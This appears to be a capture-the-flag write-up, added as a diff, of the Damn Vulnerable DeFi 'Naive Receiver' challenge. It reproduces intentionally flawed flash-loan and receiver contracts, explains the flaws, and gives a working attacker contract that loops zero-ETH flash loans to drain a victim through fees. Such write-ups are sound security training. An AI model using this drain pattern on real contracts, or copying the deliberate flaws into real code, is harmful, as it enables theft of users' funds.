@@ -1,0 +1,162 @@
+#+AUTHOR: Francesco Cannarozzo
+* Naive Receiver
+  ../contracts/naive-receiver
+** Statement
+   as an external attacker, target an user-deployed contract interacting with the pool as to empty its funds.
+   Better if in a single transaction.
+** Files
+*** NaiveReceiverLenderPool.sol
+**** Code
+     #+BEGIN_SRC solidity
+     // SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+
+/**
+ * @title NaiveReceiverLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract NaiveReceiverLenderPool is ReentrancyGuard {
+
+    using Address for address;
+
+    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
+
+    function fixedFee() external pure returns (uint256) {
+        return FIXED_FEE;
+    }
+
+    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
+
+        uint256 balanceBefore = address(this).balance;
+        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
+
+
+        require(borrower.isContract(), "Borrower must be a deployed contract");
+        // Transfer ETH and handle control to receiver
+        borrower.functionCallWithValue(
+            abi.encodeWithSignature(
+                "receiveEther(uint256)",
+                FIXED_FEE
+            ),
+            borrowAmount
+        );
+        
+        require(
+            address(this).balance >= balanceBefore + FIXED_FEE,
+            "Flash loan hasn't been paid back"
+        );
+    }
+
+    // Allow deposits of ETH
+    receive () external payable {}
+}
+
+     #+END_SRC
+**** Breakdown
+***** State
+     not the most stateful of contracts, as it only maintains an immutable *FIXED_FEE* of 1 eth.
+     the constructor is thus the default one.
+***** flashLoan
+      _NOTICE_
+      We immediately see how the borrower is *NOT* determined by *msg.sender*, but rather specified in calldata.
+      Looks fishy.
+
+      Contract performs the usual checks, including checking that *borrower* is a contract,
+      then calls *receiveEther(uint256)* from borrower contract. 
+      Finally, we check that the loan has been repaid.
+      _NOTICE_
+      borrowAmount is never checked to be greater than 0.
+*** FlashLoanReceiver.sol
+**** Code
+     #+BEGIN_SRC solidity
+     // SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/utils/Address.sol";
+
+/**
+ * @title FlashLoanReceiver
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract FlashLoanReceiver {
+    using Address for address payable;
+
+    address payable private pool;
+
+    constructor(address payable poolAddress) {
+        pool = poolAddress;
+    }
+
+    // Function called by the pool during flash loan
+    function receiveEther(uint256 fee) public payable {
+        require(msg.sender == pool, "Sender must be pool");
+
+        uint256 amountToBeRepaid = msg.value + fee;
+
+        require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
+        
+        _executeActionDuringFlashLoan();
+        
+        // Return funds to pool
+        pool.sendValue(amountToBeRepaid);
+    }
+
+    // Internal function where the funds received are used
+    function _executeActionDuringFlashLoan() internal { }
+
+    // Allow deposits of ETH
+    receive () external payable {}
+}
+     #+END_SRC
+**** Breakdown
+***** State
+      a *payable address* referring to the pool is maintained, and set via the constructor as its only argument.
+***** ReceiveEther
+      as the function expectrs to be only called by the pool, the initial requirement is *msg.sender* to equal *pool*.
+      then *amountToBeRepaid* is set to equal *msg.value* (the flash-loaned ether), plus the fee.
+      an internal  *_executeActionDuringFlashloan()* is then called, although left unimplemented.
+      then, *amountToBeRepaid* is sent back to pool.
+      
+** Exploit
+   draining the user contract is rather simple: because the pool doesn't check *msg.sender* and allows 0 as borrowAmount,
+   we can simply initiate 10 requests for a flashloan borrowing 0 ether on behalf of the victim, draining its contract 
+   through fee payment.
+
+   However, by deploying our own logic, we might be able to do everything in a single transaction.
+
+   #+BEGIN_SRC solidity
+   pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/utils/Address.sol";
+
+contract NaiveAttack {
+    using Address for address;
+
+    address private pool;
+
+        constructor(address payable poolAddress) {
+        pool = poolAddress;
+    }
+
+    function exploit(address victim) external{
+        while(victim.balance > 0) {
+            pool.functionCallWithValue(
+            abi.encodeWithSignature(
+                "flashLoan(address,uint256)",
+                victim,
+                0
+            ),
+            0
+            
+        );
+        }
+    }
+}
+
+   #+END_SRC
+
+   this is nicer, as the exploit works regardless of amount of ethers stored in the victim's contract.
